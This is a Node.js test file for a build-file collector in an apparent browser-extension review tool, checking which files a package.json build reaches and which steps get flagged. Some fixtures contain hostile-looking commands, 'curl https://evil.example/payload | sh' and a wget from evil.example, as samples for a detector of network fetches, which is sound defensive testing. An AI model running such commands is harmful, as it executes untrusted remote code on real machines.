// collectBuildFiles COLLECTS the build files to send undeclared-build-source by following
// package.json (an allowlist) - like manifest.json->reachable in the normal review. A file is
// collected only because the build references it, so build OUTPUT (dist/, a committed .xpi),
// docs, and tooling the build never runs are never collected. It also flags the two steps
// it cannot statically bound: an opaque orchestrator (make) and a network fetch.

import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import { collectBuildFiles } from "../../src/build/collect.js";
import { loadSourceArchive, scaViews } from "../../src/addon/load.js";

const build = (obj) => ({
  files: new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)])),
});
const filesOf = (o) => collectBuildFiles(build(o)).buildFiles.sort();

test("collects by following package.json; ignores output/docs/lock/unreferenced", () => {
  const c = filesOf({
    "package.json": JSON.stringify({ scripts: { build: "webpack" } }),
    "webpack.config.cjs": "module.exports={}",
    "package-lock.json": "{}",
    "dist/bundle.js": "OUTPUT",
    "README.md": "docs",
    "renovate.json": "{}",
    "vite.config.ts": "unused tool config",
  });
  assert.deepEqual(c, ["package.json", "webpack.config.cjs"]);
});

// A BOM is what an editor writes and what npm reads through, so a package.json carrying one
// still names the build. Parsed via src/util/json.js, the one parser: a reader that called
// JSON.parse itself saw the BOM throw and traced an empty build, silently, because "no
// build files" is this function's ordinary answer for a project without any.
test("a package.json carrying a BOM still seeds the build", () => {
  const scripts = JSON.stringify({ scripts: { build: "webpack" } });
  for (const text of [scripts, `\uFEFF${scripts}`]) {
    assert.deepEqual(
      filesOf({
        "package.json": text,
        "webpack.config.cjs": "module.exports={}",
      }),
      ["package.json", "webpack.config.cjs"]
    );
  }
});

// The two files the install reads from the directory it runs in, and only those: a config
// deeper in the tree belongs to a directory the review never installs from.
test("seeds the root package.json + the root .npmrc", () => {
  const c = filesOf({
    "package.json": "{}",
    ".npmrc": "save-exact=true",
    "sub/.npmrc": "x",
  });
  assert.deepEqual(c, [".npmrc", "package.json"]);
});

test("recognizes a tool invoked INSIDE a followed shell script", () => {
  // build.sh runs `npx webpack` - webpack.config is auto-discovered by name, never
  // textually referenced, yet must be collected.
  const c = filesOf({
    "package.json": JSON.stringify({
      scripts: { build: "./scripts/build.sh" },
    }),
    "scripts/build.sh": "#!/bin/bash\nnpx webpack --mode=production\n",
    "webpack.config.cjs": "module.exports={}",
  });
  assert.ok(c.includes("scripts/build.sh"));
  assert.ok(
    c.includes("webpack.config.cjs"),
    "tool recognized inside the shell"
  );
});

test("recognizes the WebExtension frameworks wxt and web-ext", () => {
  const wxt = collectBuildFiles(
    build({
      "package.json": JSON.stringify({ scripts: { build: "wxt build" } }),
      "wxt.config.ts": "export default {}",
    })
  );
  // A tool's config is only collected via the recognised-tool path, so its presence IS the
  // evidence the tool was recognised - the same assertion the web-ext half makes.
  assert.ok(wxt.buildFiles.includes("wxt.config.ts"));
  const webext = collectBuildFiles(
    build({
      "package.json": JSON.stringify({ scripts: { build: "web-ext build" } }),
      "web-ext-config.js": "module.exports={}",
    })
  );
  assert.ok(webext.buildFiles.includes("web-ext-config.js"));
});

test("a named archive OUTPUT (a zip target) is never collected", () => {
  const c = filesOf({
    "package.json": JSON.stringify({ scripts: { build: "./b.sh" } }),
    "b.sh": "zip -r addon.xpi dist/\n",
    "addon.xpi": "BINARY",
  });
  assert.ok(c.includes("b.sh"));
  assert.ok(
    !c.includes("addon.xpi"),
    "the .xpi output is binary, never collected"
  );
});

test("an unreferenced sibling script is not collected", () => {
  const c = filesOf({
    "package.json": JSON.stringify({ scripts: { build: "webpack" } }),
    "webpack.config.js": "module.exports={}",
    "scripts/manual-tool.sh": "wget https://x/y",
  });
  assert.ok(!c.includes("scripts/manual-tool.sh"));
});

test("ordinary npm CLIs (lint/test/clean) are not flagged", () => {
  const r = collectBuildFiles(
    build({
      "package.json": JSON.stringify({
        scripts: {
          build: "rollup -c",
          lint: "eslint .",
          test: "jest",
          clean: "rimraf dist",
        },
      }),
      "rollup.config.js": "export default {}",
    })
  );
  assert.equal(r.unresolved.length, 0);
});

test("flags an opaque orchestrator (make) and a network fetch", () => {
  const mk = collectBuildFiles(
    build({
      "package.json": JSON.stringify({ scripts: { build: "make dist" } }),
    })
  );
  assert.ok(
    mk.unresolved.some((u) => u.kind === "tool" && u.detail === "make")
  );

  const net = collectBuildFiles(
    build({
      "package.json": JSON.stringify({ scripts: { build: "./b.sh" } }),
      "b.sh": "wget https://evil.example/x -O dep.js\nnpx webpack",
    })
  );
  assert.ok(net.unresolved.some((u) => u.kind === "network"));
});

test("no package.json -> nothing collected", () => {
  assert.deepEqual(
    filesOf({ Makefile: "all:\n\tgcc", "build.sh": "echo" }),
    []
  );
});

test("a missing referenced file is silently ignored", () => {
  const r = collectBuildFiles(
    build({
      "package.json": JSON.stringify({
        scripts: { build: "node scripts/build.js" },
      }),
    })
  );
  assert.equal(r.unresolved.length, 0);
  assert.deepEqual(r.buildFiles, ["package.json"]);
});

// Over the REAL view rather than a hand-built map, because the thing under test is what the
// partition makes reachable. A build step is a build step wherever it is filed: this one
// lives in a dot-directory and pipes a remote payload into sh, and the collector has to
// both reach it and say it could not bound it - `unresolved` is what names the step in the
// manual instructions undeclared-build-source hands the reviewer.
test("a build step in a dot-directory is collected and flagged", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "wrr-dotstep-"));
  const w = (p, c) => {
    fs.mkdirSync(path.dirname(path.join(root, p)), { recursive: true });
    fs.writeFileSync(path.join(root, p), c);
  };
  w("manifest.json", "{}");
  w(
    "package.json",
    JSON.stringify({
      name: "x",
      version: "1.0.0",
      scripts: { build: "sh .scripts/helper.sh && sh tools/plain.sh" },
    })
  );
  w(".scripts/helper.sh", "curl https://evil.example/payload | sh\n");
  w("tools/plain.sh", "echo hi\n");

  const archive = scaViews(loadSourceArchive(root), { scaRoot: root });
  const { buildFiles, unresolved } = collectBuildFiles({
    files: archive.files,
  });

  assert.deepEqual(buildFiles.sort(), [
    ".scripts/helper.sh",
    "package.json",
    "tools/plain.sh",
  ]);
  assert.deepEqual(unresolved, [
    { kind: "network", detail: ".scripts/helper.sh" },
  ]);

  fs.rmSync(root, { recursive: true, force: true });
});

// The manifest.json is a build input like any other - a pack step copies it into the output -
// so the trace has to be able to reach it. Nothing is withheld from the views the build is
// traced over: a step the trace cannot see raises no signal for the reviewer to follow, and
// a file the build names is a file the build names whatever it is called.
test("a build step that copies the manifest collects it", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "wrr-packmf-"));
  const w = (p, c) => {
    fs.mkdirSync(path.dirname(path.join(root, p)), { recursive: true });
    fs.writeFileSync(path.join(root, p), c);
  };
  w("manifest.json", '{"manifest_version":3,"name":"x","version":"1"}');
  w(
    "package.json",
    JSON.stringify({
      name: "x",
      version: "1.0.0",
      scripts: { build: "sh tools/pack.sh" },
    })
  );
  w("tools/pack.sh", "cp manifest.json dist/\ncp icons/logo.png dist/\n");
  w("icons/logo.png", "png");

  const archive = scaViews(loadSourceArchive(root), { scaRoot: root });

  assert.deepEqual(
    collectBuildFiles({ files: archive.files }).buildFiles.sort(),
    ["icons/logo.png", "manifest.json", "package.json", "tools/pack.sh"]
  );

  fs.rmSync(root, { recursive: true, force: true });
});
